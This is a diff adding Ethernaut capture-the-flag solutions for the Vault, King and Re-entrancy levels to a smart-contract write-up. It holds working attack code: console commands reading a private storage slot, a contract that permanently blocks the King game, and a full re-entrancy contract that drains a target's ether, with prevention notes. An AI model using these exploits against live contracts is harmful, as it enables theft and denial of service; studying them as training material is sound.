@@ -327,5 +327,109 @@ Send some ether to the contract while deploying it. If we want, we can check the
 NOTE – In the current version of solidity, `0.8.20` `selfdestruct()` doesn’t delete the contract unless it is executed in the same transaction in which the contract was created. It just sends all the ether present in the contract to the address specified.
 
 ___
+## Level 8 [Vault]
+
+This level shows that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.
+
+web3.js is a collection of libraries that allows us to interact with a local or remote ethereum node using HTTP, IPC or WebSocket. We can use this library to fetch the value of the password variable which was set using the constructor when the contract was deployed, even though it is private.
+
+I have completed this challenge using the developer console. Find the list of commands below -
+
+```javascript
+await web3.eth.getStorageAt(contract.address, 1)
+
+await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
+```
+
+The details about the first command above can be found in the [web3 Documentation](https://web3js.readthedocs.io/en/v1.10.0/).
+
+The '1' argument in that command is for the storage slot whose value we are interested in. In our case, it is '1' since we want the value of the password variable, and it is stored in the 1st slot, while, the locked variable is stored in the 0th slot, as we can see in the challenge contract.
+
+After we get the value of the password variable from the first command, we pass it to the unlock function to unlock the contract.
+
+___
+## Level 9 [King]
+
+This level illustrates a very important feature of the `transfer()` function that is used to transfer ether in solidity. It is very important to understand that a `transfer()` function fails if there is no `payable` `fallback()` or `receive()` function in the recipient contract and the transaction is reverted.
+
+In the challenge contract, if someone wants to change the value of the king variable and hence become the king of the contract he/she will need to send some amount of ether to the contract which is greater in value than the prize variable. To complete the challenge, we will need to do something so that no other person is able to claim the kingship of the contract by changing the value of the king variable.
+
+```solidity
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    payable(king).transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+```
+
+In this code fragment, we can see that the value of the king variable changes once thereis a successful transfer of the prize amount to the previous king. This is done using the `transfer()` function. And, like discussed above, a `transfer()` function fails if there is no `payable` `fallback()` or `receive()` function in the recipient contract. So, we can stop the change of the value of the king variable by stopping the `transfer()` function from executing and sending us the prize ether.
+
+```solidity
+contract hack {
+    constructor (address payable target) payable {
+        uint prize = King(target).prize();
+        (bool success, ) = target.call{value: prize}("");
+        require(success, "call failed");
+    }
+}
+```
+
+If we implement this hack contract, the `call()` function will change the king variable from to our address. Now, notice that there is no `payable` `fallback()` or `receive()` function in the recipient contract. Hence, whenever the challenge contract tries to transfer ether to this contract it will fail and the transaction will be reverted. Hence, the value of the king variable won't change in the next line of the challenge contract as that line of code won't be executed. We just need to deploy this contract in the instance address and submit the instance to complete the challenge.
+
+NOTE - If `send()` or `call()` was used instead of `transfer()` in the challenge contract, the transfer of ether would fail if there was no `payable` `fallback()` or `receive()` function in the recipient contract. But, it won't revert, so the remaining lines of code in the code fragment would be executed. So, in case of `send()` or `call()`, it is vital to check the return value from these functions. This is a very important difference between `send()` or `call()` and `transfer()`, all three being used for transferring ether. I am still thinking of what implications and differences this might have in terms of security issues for a smart contract.
+
+___
+## Level 10 [Re-entrancy]
+
+This level helps us understand the classic re-entrancy attack (one of my favourites).
+
+A re-entrancy attack is a recursive attack that can be done on contracts in which the state variables associated with the balance of an address are modified after the ether is transferred. We can see that in our case, the challenge contract is susceptible to this type of attack because the balance of `msg.sender` is updated only after the ether has been transferred in the balances mapping. Re-entrancy attacks are done by recursively executing code inside a `receive()` or a `fallback()` function, that basically calls functions in the victim contract to send ether to the attacking contract. When ether is sent, these functions are executed which in turn executes the code inside their body calling functions in the victim contract again to withdraw ether. This recursive process goes on untill the balance of the victim contract becomes 0.
+
+Find my attack contract below -
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+interface IReentrancy {
+    function donate(address) external payable;
+    function withdraw(uint) external;
+}
+
+contract hack {
+    IReentrancy private immutable target;
+
+    constructor (address _target) {
+        target = IReentrancy(_target);
+    }
+
+    function attack () external payable {
+        target.donate{value: 1e18}(address(this));
+        target.withdraw(1e18);
+
+        require (address(target).balance == 0, "target balance > 0");
+        selfdestruct(payable(msg.sender));
+    }
+
+    receive() external payable {
+        uint amount = min (1e18, address(target).balance);
+        if (amount>0) {
+            target.withdraw(amount);
+        }
+        
+    }
+
+    function min (uint x, uint y) private pure returns(uint) {
+        return (x>y? y : x);
+    }
+}
+```
+
+The attack function first sends some ether to the challenge contract in order to have some balance against the Hack contract's address in the balances mapping using the `donate()` function. The `withdraw()` function is then called, which will invoke the receive function, which again calls the withdraw function. The `min()` function is used to determine the minimum amount that can be withdrwan from the contract. This recursive calling continues until the balance of the challenge contract is 0. Notice, I also used the selfdestruct function to return all the ether I spent to my wallet again.
+
+Re-entrancy is one of the most simple and popular attacks till date. To prevent re-entrancy we should always update the balances and state variables before sending out ether. Other techniques like invoking a lock of the contract untill a particular transaction is completed can also be useful.
+
+___
 
 # More solutions coming soon!
